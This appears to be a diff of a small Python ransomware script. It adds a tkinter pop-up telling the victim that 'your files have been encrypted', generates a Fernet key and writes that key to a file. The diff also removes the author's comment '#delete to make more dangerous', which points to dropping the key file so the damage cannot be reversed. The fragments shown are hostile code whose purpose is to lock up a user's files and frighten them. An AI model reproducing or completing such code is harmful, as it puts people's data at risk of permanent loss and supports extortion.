@@ -5,11 +5,11 @@ import tkinter as tk
 from tkinter import messagebox
 
 def show_warning():
-    # Create the root window
-    root = tk.Tk()
-    root.withdraw()  # Hide the root window
     
-    # Show a warning message box
+    root = tk.Tk()
+    root.withdraw()
+    
+    
     messagebox.showwarning(
         "execution Complete",
         "your computer has been corrupted. Your files have been encrypted. "
@@ -29,7 +29,7 @@ print(files)
 
 key = Fernet.generate_key()
 
-#delete to make more dangerous
+
 with open("thekey.key", "wb") as thekey:
         thekey.write(key)
 
